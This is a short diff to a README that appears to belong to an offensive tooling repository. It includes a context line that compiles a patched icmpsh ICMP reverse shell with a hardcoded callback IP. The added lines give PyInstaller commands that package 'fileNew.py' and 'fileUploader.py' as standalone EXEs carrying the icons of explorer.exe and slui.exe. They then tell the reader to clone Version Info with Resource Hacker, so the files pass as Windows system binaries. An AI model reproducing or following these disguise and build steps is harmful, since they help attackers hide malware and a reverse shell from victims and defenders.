@@ -29,7 +29,22 @@ cl.exe icmpsh-s.patch.c /D"MY_IP=\"192.168.191.128\""
 
 ### Python code
 
-Pack it into EXE
+
+#### fileNew.py
+
+```
+pyinstaller --additional-hooks-dir C:\Python34\Lib\site-packages\_pyinstaller_hooks_contrib\hooks\stdhooks --onefile --paths=C:\python34\lib\site-packages -i "C:\Windows\explorer.exe" fileNew.py
+```
+
+#### fileUploader.py
+
+```
+pyinstaller --additional-hooks-dir C:\Python34\Lib\site-packages\_pyinstaller_hooks_contrib\hooks\stdhooks --hidden-import=queue --onefile --paths=C:\python34\lib\site-packages -i "C:\Windows\System32\slui.exe" fileUploader.py
+```
+
+Then use Resource Hacker to clone Version Info.
+
+See output/compiled.zip for example.
 
 ## Infiltrate
 
